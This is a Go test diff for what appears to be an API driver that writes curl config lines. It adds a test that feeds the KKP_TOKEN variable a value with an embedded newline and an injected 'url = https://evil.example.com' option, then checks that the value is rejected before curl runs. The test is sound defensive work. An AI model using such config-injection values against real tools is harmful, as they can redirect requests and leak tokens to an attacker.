@@ -268,6 +268,24 @@ func TestAPICurlArgvExact(t *testing.T) {
 	}
 }
 
+// A token with a CR or LF would end the `header = "…"` config line and
+// start another curl option, so it never reaches curl.
+func TestAPIRefusesTokenWithNewline(t *testing.T) {
+	setKKPEnv(t)
+	t.Setenv("KKP_TOKEN", "abc\nurl = https://evil.example.com")
+	d, runner, stderr := testDriver(t)
+	_, err := d.api(t.Context(), "GET", "/api/v2/dc", "", stderr)
+	if err == nil {
+		t.Fatal("expected an error")
+	}
+	if !strings.Contains(stderr.String(), "environment variable KKP_TOKEN must not contain a newline") {
+		t.Fatalf("stderr = %q", stderr.String())
+	}
+	if len(runner.calls) != 0 {
+		t.Fatal("curl must not run with a token that breaks the config line")
+	}
+}
+
 func TestCurlConfigQuoteEscapes(t *testing.T) {
 	t.Parallel()
 	if got, want := curlConfigQuote(`a"b\c`), `"a\"b\\c"`; got != want {
